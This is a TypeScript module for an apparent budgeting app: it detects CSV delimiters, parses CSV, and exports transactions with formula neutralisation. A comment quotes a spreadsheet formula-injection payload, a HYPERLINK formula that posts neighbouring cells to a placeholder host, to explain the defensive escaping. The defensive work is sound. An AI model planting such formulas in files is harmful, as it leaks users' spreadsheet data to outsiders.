import type { HeaderMap } from "./schema";
import { COLUMNS, mapHeaders } from "./schema";
import type { RawRow } from "./normalize";
import type { LoadProblem, Transaction } from "./types";

/**
 * CSV in and CSV out.
 *
 * Hand-rolled rather than pulled from a package: the format is small, the repo
 * has no parsing dependency and does not want one, and the two things that
 * actually break real files — the delimiter and the decimal separator — are
 * decisions a general-purpose parser would hand back to us anyway.
 *
 * The CSV path is an escape hatch, not the main road. It exists so someone on
 * Google Sheets, or with five years of history in their own spreadsheet, is not
 * locked out. The workbook is what the app reads normally.
 */

const CANDIDATES = [",", ";", "\t"] as const;
export type Delimiter = (typeof CANDIDATES)[number];

/**
 * Guess the delimiter by counting unquoted candidates in the header line.
 *
 * Worth doing properly: a European Excel exports semicolon-separated with comma
 * decimals, and parsing that as comma-separated turns every amount into a pair
 * of broken columns without erroring once.
 */
export function detectDelimiter(sample: string): Delimiter {
  const line = sample.split("\n").find((l) => l.trim() !== "") ?? "";
  let best: Delimiter = ",";
  let bestCount = -1;

  for (const d of CANDIDATES) {
    let count = 0;
    let inQuotes = false;
    for (let i = 0; i < line.length; i++) {
      const c = line[i];
      if (c === '"') inQuotes = !inQuotes;
      else if (c === d && !inQuotes) count++;
    }
    if (count > bestCount) {
      bestCount = count;
      best = d;
    }
  }
  return best;
}

/**
 * RFC 4180, plus the things real files do: a UTF-8 BOM from Excel, CRLF or bare
 * CR line endings, doubled quotes as an escape, and newlines inside quoted
 * fields.
 */
export function parseCsv(text: string, delimiter?: Delimiter): string[][] {
  let s = text;
  if (s.charCodeAt(0) === 0xfeff) s = s.slice(1);
  // Normalise every line ending up front so the state machine only ever sees
  // "\n" — including inside a quoted field, where a stray "\r" would otherwise
  // survive into the value.
  s = s.replace(/\r\n?/g, "\n");

  const d = delimiter ?? detectDelimiter(s);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;

  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (inQuotes) {
      if (c === '"') {
        if (s[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += c;
      }
      continue;
    }
    if (c === '"') inQuotes = true;
    else if (c === d) {
      row.push(field);
      field = "";
    } else if (c === "\n") {
      row.push(field);
      field = "";
      rows.push(row);
      row = [];
    } else field += c;
  }

  // A trailing newline leaves nothing pending; anything else is a final row.
  if (field !== "" || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

export interface CsvRows {
  raws: RawRow[];
  map: HeaderMap;
  problems: LoadProblem[];
}

/**
 * Split a parsed grid into a header map and rows. Row numbers stay 1-based with
 * the header as row 1, so a reported problem points at the same line the user
 * sees in their editor.
 */
export function csvToRawRows(cells: readonly string[][], fileName: string): CsvRows {
  if (cells.length === 0) {
    return {
      raws: [],
      map: { byKey: {}, unknown: [], missing: COLUMNS.map((c) => c.key) },
      problems: [{ level: "error", file: fileName, message: "the file is empty" }],
    };
  }

  const map = mapHeaders(cells[0]);
  const raws: RawRow[] = cells.slice(1).map((row, i) => ({
    sheet: "CSV",
    row: i + 2,
    cells: row,
  }));

  const problems: LoadProblem[] = [];
  if (Object.keys(map.byKey).length === 0) {
    problems.push({
      level: "error",
      file: fileName,
      row: 1,
      message:
        "none of the column headings were recognised — the first row needs to name the columns, like Date, Category, Amount",
    });
  }

  return { raws, map, problems };
}

/** Excel and Sheets evaluate a cell whose text starts with one of these. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
/** ...but a bare number is never a formula. See the note in `escapeField`. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/;

/**
 * RFC 4180 quoting, plus formula neutralisation.
 *
 * Quoting alone does not stop a formula: the CSV is parsed first, and the cell
 * text is evaluated after. So a Note that rode in from someone else's workbook
 * as `=HYPERLINK("https://x/?d="&A1&B1,"Open")` posts neighbouring cells the
 * moment the export is opened. `note`, `category`, `account`, `paymentMethod`
 * and every `extra` value AND ITS COLUMN NAME come straight from the input
 * file, so all of them reach here untouched.
 *
 * The `PLAIN_NUMBER` exemption keeps the guard from mangling data that is
 * merely numeric. `amount` is always >= 0 so it never trips the test, but an
 * `extra` column the user added themselves — a balance, a delta, anything that
 * can hold `-12.50` — round-trips through here, and quoting it as `'-12.50`
 * would turn a number into text on every export.
 */
function escapeField(value: string, delimiter: Delimiter): string {
  const safe = FORMULA_LEAD.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
  return /["\n]/.test(safe) || safe.includes(delimiter) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/**
 * Flat export of everything loaded, generated on demand.
 *
 * This is what replaced the workbook's "ALL DATA" sheet: a derived sheet can
 * only be as fresh as the last time the app wrote to the file, whereas this is
 * built from what is on screen and is therefore never behind. Unknown columns
 * ride along so an export round-trips (schema rule 3).
 */
export function toCsv(txs: readonly Transaction[], delimiter: Delimiter = ","): string {
  const cols = COLUMNS.filter((c) => c.key !== "serial");
  const extraKeys = [...new Set(txs.flatMap((t) => Object.keys(t.extra)))].sort();
  const header = [...cols.map((c) => c.header), ...extraKeys];

  const value = (t: Transaction, key: string): string => {
    switch (key) {
      case "date":
        return t.date;
      case "category":
        return t.category;
      case "type":
        return t.type;
      case "amount":
        return String(t.amount);
      case "note":
        return t.note;
      case "paymentMethod":
        return t.paymentMethod ?? "";
      case "account":
        return t.account ?? "";
      case "needWant":
        return t.needWant ?? "";
      case "kind":
        return t.kind;
      case "interval":
        return t.interval ?? "";
      default:
        return "";
    }
  };

  const lines = [header.map((h) => escapeField(h, delimiter)).join(delimiter)];
  for (const t of txs) {
    const row = [
      ...cols.map((c) => value(t, c.key)),
      ...extraKeys.map((k) => t.extra[k] ?? ""),
    ];
    lines.push(row.map((v) => escapeField(v, delimiter)).join(delimiter));
  }
  return lines.join("\n");
}
